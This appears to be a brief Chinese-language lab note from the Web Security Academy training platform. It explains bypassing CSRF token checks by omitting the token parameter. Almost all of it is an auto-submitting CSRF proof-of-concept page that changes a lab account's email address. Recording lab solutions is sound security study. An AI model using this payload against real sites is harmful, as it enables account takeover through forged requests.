# 知识点
通过删除CSRF tokens参数来绕过CSRF tokens验证
# 思路
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://ac211ffb1ec06b04c058d6e6008f002d.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="1395480051&#64;qq&#46;com" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

```
